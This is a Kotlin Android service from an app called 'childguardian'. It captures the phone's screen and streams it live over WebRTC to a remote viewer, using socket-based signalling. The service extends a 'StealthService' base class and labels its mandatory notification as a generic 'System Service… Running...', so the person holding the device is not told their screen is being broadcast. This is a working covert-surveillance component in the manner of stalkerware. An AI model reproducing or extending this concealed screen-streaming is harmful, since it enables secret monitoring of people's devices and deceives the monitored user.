package com.childguardian.services.screen

import android.content.Intent
import android.hardware.display.VirtualDisplay
import android.os.Build
import android.os.IBinder
import com.childguardian.data.remote.socket.SocketManager
import com.childguardian.services.base.StealthService
import com.childguardian.webrtc.WebRTCManager
import dagger.hilt.android.AndroidEntryPoint
import timber.log.Timber
import javax.inject.Inject
import org.webrtc.*
import android.app.Activity
import android.content.Context
import android.hardware.display.DisplayManager
import android.media.projection.MediaProjectionManager
import android.content.pm.ServiceInfo
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import org.json.JSONObject
@AndroidEntryPoint
class ScreenCaptureService : StealthService() {

    @Inject
    lateinit var mediaProjectionHolder: MediaProjectionHolder

    @Inject
    lateinit var webRTCManager: WebRTCManager

    @Inject
    lateinit var socketManager: SocketManager


    private var virtualDisplay: VirtualDisplay? = null
    private var viewerId: String? = null

    override fun onCreate() {
        super.onCreate()
        Timber.d("ScreenCaptureService created")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "ScreenCaptureChannel",
                "Screen Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, "ScreenCaptureChannel")
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()

        // <<< THE ANDROID 14 FIX IS RIGHT HERE <<<
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                101,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION // Satisfies the strict API 34 requirement
            )
        } else {
            startForeground(101, notification)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        // Get viewerId from intent (if any)
        viewerId = intent?.getStringExtra("VIEWER_ID")
        // 2. Catch the Permission Ticket
        val resultCode = intent?.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED) ?: Activity.RESULT_CANCELED
        val permissionData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra("DATA", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra<Intent>("DATA")
        }
        if (viewerId != null && resultCode == Activity.RESULT_OK && permissionData != null) {
            Timber.d("Engine Ignition! Starting stream for: $viewerId")

            setupSignalingListeners()

            // 3. PASS THE TICKET to your capture function
            // You likely need to update your startScreenCapture(resultCode, permissionData)
            // signature to accept these!
            startScreenCapture(resultCode, permissionData)

        } else {
            Timber.w("Missing credentials: Viewer=$viewerId, Data=${permissionData != null}")
        }

        return START_STICKY
    }

    @Suppress("UNCHECKED_CAST")
    private fun setupSignalingListeners() {
        // Listen for answer from viewer
        socketManager.on("answer") { args: Array<Any> ->
            if (args.isNotEmpty()) {
                try {
                    val data = args[0] as JSONObject
                    Timber.d(">>> RAW ANSWER ENVELOPE RECEIVED: $data") // Let's see exactly what the Mac sent

                    val answerSdp = data.getJSONObject("answer")
                    val type = answerSdp.getString("type")
                    val sdp = answerSdp.getString("sdp")

                    val sessionDescription = SessionDescription(
                        SessionDescription.Type.fromCanonicalForm(type),
                        sdp
                    )
                    webRTCManager.setRemoteDescription(sessionDescription)
                    Timber.d(">>> SUCCESS! Received and set remote SDP answer! Tunnel is OPEN! <<<")
                } catch (e: Exception) {
                    Timber.e("Failed to parse answer JSON: ${e.message}")
                }
            }
        }

        // Listen for ICE candidates from viewer
        socketManager.on("ice-candidate") { args: Array<Any> ->
            if (args.isNotEmpty()) {
                try {
                    val data = args[0] as JSONObject
                    val candidateData = data.getJSONObject("candidate")

                    // <<< THE FIX: Read the Mac's JS format correctly <<<
                    val sdpString = if (candidateData.has("candidate")) {
                        candidateData.getString("candidate") // Read the JS label
                    } else {
                        candidateData.getString("sdp") // Fallback for Android label
                    }

                    val candidate = IceCandidate(
                        candidateData.getString("sdpMid"),
                        candidateData.getInt("sdpMLineIndex"),
                        sdpString
                    )
                    webRTCManager.addIceCandidate(candidate)
                    Timber.d(">>> SUCCESS! Received remote ICE candidate! Connecting paths... <<<")
                } catch (e: Exception) {
                    Timber.e("Failed to parse ICE JSON: ${e.message}")
                }
            }
        }
    }
    // 1. Update the function to accept the ticket from onStartCommand
    private fun startScreenCapture(resultCode: Int, data: Intent) {
        val metrics = resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels

        Timber.d("Virtual Display active. Handing ticket to WebRTC...")

        // 1. Hand the permission ticket directly to the new WebRTC capturer
        webRTCManager.startCapture(data, width, height)

        // 2. Open the tunnel
        setupWebRTC()
    }

    private fun setupWebRTC() {
        // Define ICE servers (STUN)
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
        )

        // Create peer connection with observer
        webRTCManager.createPeerConnection(iceServers, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
            override fun onIceConnectionReceivingChange(b: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}

            // <<< UPDATED: ICE Candidate Block using real JSON >>>
            override fun onIceCandidate(candidate: IceCandidate?) {
                candidate?.let {
                    Timber.d(">>> SUCCESS! ICE CANDIDATE CREATED! Mailing it... <<<")
                    val candidateJson = JSONObject()
                    candidateJson.put("sdpMid", it.sdpMid)
                    candidateJson.put("sdpMLineIndex", it.sdpMLineIndex)
                    candidateJson.put("sdp", it.sdp)

                    val payload = JSONObject()
                    payload.put("targetId", viewerId) // Label 1
                    payload.put("viewerId", viewerId) // Label 2
                    payload.put("candidate", candidateJson)

                    socketManager.emit("ice-candidate", payload)
                }
            }

            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(dataChannel: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
        })

        // Add the video track
        webRTCManager.addVideoTrack()

        // <<< UPDATED: Offer Block using real JSON and fixed typo >>>
        webRTCManager.onSessionDescription = { sdp ->
            Timber.d(">>> SUCCESS! SDP OFFER CREATED! Mailing it to Mac... <<<")

            val offerJson = JSONObject()
            offerJson.put("type", sdp.type.canonicalForm())
            offerJson.put("sdp", sdp.description)

            val payload = JSONObject()
            payload.put("targetId", viewerId) // Label 1 for Server
            payload.put("viewerId", viewerId) // Label 2 for Server
            payload.put("offer", offerJson)

            socketManager.emit("offer", payload)
        }

        webRTCManager.createOffer()
    }



    override fun onDestroy() {
        super.onDestroy()

        // <<< ADDED: Turn off the radio receivers so they don't leak memory <<<
        socketManager.off("answer")
        socketManager.off("ice-candidate")

        virtualDisplay?.release()
        webRTCManager.release()
        Timber.d("ScreenCaptureService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}